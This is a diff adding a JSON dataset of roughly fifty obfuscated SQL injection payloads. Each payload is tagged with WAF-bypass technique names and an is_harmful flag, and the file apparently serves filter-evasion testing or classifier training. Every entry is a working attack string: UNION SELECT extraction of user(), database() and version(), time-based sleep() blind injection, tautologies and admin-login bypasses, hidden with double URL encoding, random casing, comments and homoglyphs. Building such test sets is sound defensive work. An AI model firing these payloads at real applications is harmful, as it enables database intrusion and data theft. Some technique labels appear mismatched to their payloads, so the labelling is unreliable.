@@ -1,0 +1,402 @@
+[
+  {
+    "payload": "%252527%252520and%252520%252528select%2525201%252520from%252520%252528select%252528sleep%2525285%252529%252529%252529A%252529--%252520",
+    "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527/%252a%252A/uNIon/%252a%252A/SElEcT/%252a%252A/1%252CUser%2528%2529%252c3--/%252a%252a/",
+    "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%2520/*!AND*/%25201%253d1--",
+    "technique": "Boolean-based Blind_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "1%2509OR%2509SLEEP%25283%2529-- /*67*/ -- 43",
+    "technique": "Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "1%26id%3Dadmin' %20/%2A/ -- 54 /*9*/",
+    "technique": "Boolean-based Blind_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "%2527%2520uNiON%2520Select%25201%252cUSER%2528%2529%252C3--%2520",
+    "technique": "Union Select Null Bytes_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%2520UNIoN%2520sELECT%25201%252CUser%2528%2529%252C3--%2520",
+    "technique": "Boolean-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "aDmIN%2527%252B--",
+    "technique": "Boolean-based Blind_full_bypass+Time-based Blind_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "%2527%2520uNiON%2520sELECT%25201%252cUser%2528%2529%252C3--%2520",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "1%2520or%25201%253d1",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%252527%252520And%252520%252528SelECt%2525201%252520FRoM%252520%252528SeLECt%252528sLeEp%2525285%252529%252529%252529A%252529--%252520",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%252BArE%252b1%253d1",
+    "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "%2527%2520uNiON%2520SELect%25201%252cUser%2528%2529%252C3--%2520",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "1%2520oR%25201%253d1",
+    "technique": "Time-based Blind_full_bypass+Boolean-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%2520And%2520%2528seLEcT%25201%2520FroM%2520%2528sEleCT%2528Sleep%25285%2529%2529%2529a%2529--%2520",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527/%252A%252150000UNION%252a/SELECT%252B1%252Cdatabase%2528%2529%2523",
+    "technique": "Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "%2527%2520AnD%2520%2528SElEct%25201%2520FrOM%2520%2528sELEcT%2528SLEep%25285%2529%2529%2529a%2529--%2520",
+    "technique": "Union Select Null Bytes_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527/%252A%252a/UNiOn/%252a%252A/seLECt/%252\u0410%252\u0430\uff0f1%252Cu\u0405\u0435R%2528%2529%252c3--/%252A%252A/",
+    "technique": "Union Select Null Bytes_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "admIN%2527%252B--",
+    "technique": "Union Select Null Bytes_adv_obf_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "ADmiN%2527%2520--",
+    "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "1%2520oR%25201%253d1",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "aDMin%2527%252509--",
+    "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527/%252a%252A/unIoN/%252\u0410%252\u0430/SElEcT/%252\u0430%252a/1%252cuSeR%2528%2529%252c3--/%252a%252a/",
+    "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%252527%252520AND%252520%252528SelEct%2525201%252520froM%252520%252528seLECt%252528sleEP%2525285%252529%252529%252529a%252529--%252520",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%2520uNiON%2520SElECT%25201%252cUser%2528%2529%252C3--%2520",
+    "technique": "Union Select Null Bytes_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%25EF%25BD%2581D%25EF%25BC%2590UNIoN%25EF%25BC%2590SeleCT%25EF%25BC%25901%252CVeRSiON%2528%2529%2523 -- 46 /*7*/",
+    "technique": "Union Select Null Bytes_adv_obf_full_bypass+Boolean-based Blind_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "%252527/%25252a%25252A/oR/%25252aA%25252a%25252A/1%25253d1",
+    "technique": "Time-based Blind_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "1%25252BOR%25252B1%25253D1",
+    "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+Time-based Blind_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "%2527%2520uNiON%2520SELect%25201%252cUser%2528%2529%252C3--%2520",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "AdmiN%2527%2520--",
+    "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%2520ANd%2520%2528/%252A%2521seLeCT%252a/%25201%2520frOm%2520%2528/%252a%2521SeleCt%252a/%2528SLeEp%25285%2529%2529%2529a%2529--%2520",
+    "technique": "Union Select Null Bytes_adv_obf_full_bypass+Boolean-based Blind_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "%2527%2520aND%2520%2528SeLeCT%25201%2520frOM%2520%2528SELeCt%2528SLEEp%25285%2529%2529%2529A%2529--%2520",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527/%252a%252A/UniON/%252a%252A/seLect/%252A%252a/1%252cuSER%2528%2529%252c3--/%252a%252A/",
+    "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%252527%252520AND%252520%252528SElecT%2525201%252520froM%252520%252528SelecT%252528Sleep%2525285%252529%252529%252529A%252529--%252520",
+    "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520",
+    "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%2520anD%2520%2528selECT%25201%2520FROm%2520%2528sEleCT%2528SLEep%25285%2529%2529%2529A%2529--%2520",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%252527%252520anD%252520%252528selEct%2525201%252520FRom%252520%252528sElECt%252528SleEp%2525285%252529%252529%252529A%252529--%252520",
+    "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "1%252F%25252a%25252A%2FoR%252Fa%252D1%253d1",
+    "technique": "Boolean-based Blind_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "%2527%2520UNIoN%2520sELECT%25201%252CUser%2528%2529%252c3--%2520",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%2520uNiON%2520Select%25201%252cUSER%2528%2529%252C3--%2520",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "ADmin%2527%2520--",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%252527%252520and%252520%252528select%2525201%252520from%252520%252528select%252528sleep%2525285%252529%252529%252529a%252529--%252520",
+    "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%2520UNIoN%2520sELECT%25201%252CUsEr%2528%2529%252C3--%2520",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "admin%2527 %26port%3D3128 -- 40 /*9*/",
+    "technique": "Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "ADMin%2509--",
+    "technique": "Union Select Null Bytes_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520",
+    "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "1%26id%3Dadmin' %20--%2B",
+    "technique": "Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%2527%2520uNiON%2520SELect%25201%252cUser%2528%2529%252C3--%2520",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  },
+  {
+    "payload": "%257c%257C%2520copy%2520%2528select%25201%252cUSER%2528%2529%252c3--",
+    "technique": "Time-based Blind_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": false
+  },
+  {
+    "payload": "1%2520OR%25201%253d1",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": true
+  }
+]
